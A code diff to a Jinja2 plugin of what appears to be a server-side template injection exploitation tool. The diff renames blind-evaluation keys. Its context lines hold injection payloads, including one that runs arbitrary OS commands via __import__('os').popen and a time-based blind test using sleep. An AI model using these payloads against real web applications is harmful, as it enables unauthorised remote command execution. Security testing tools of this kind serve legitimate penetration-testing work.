@@ -40,13 +40,13 @@ class Jinja2(Plugin):
             'execute': """__import__('os').popen('%(code)s').read()"""
         },
         'blind' : {
-            'call': 'blind_evaluate',
+            'call': 'evaluate_blind',
             'bool_true' : """'a'.join('ab') == 'aab'""",
             'bool_false' : 'True == False'
         },
-        'blind_evaluate_bool' : {
+        'evaluate_blind' : {
             'call': 'evaluate',
-            'blind_evaluate_bool': """%(code)s and __import__('time').sleep(%(delay)i)"""
+            'evaluate_blind': """%(code)s and __import__('time').sleep(%(delay)i)"""
         }
 
     }
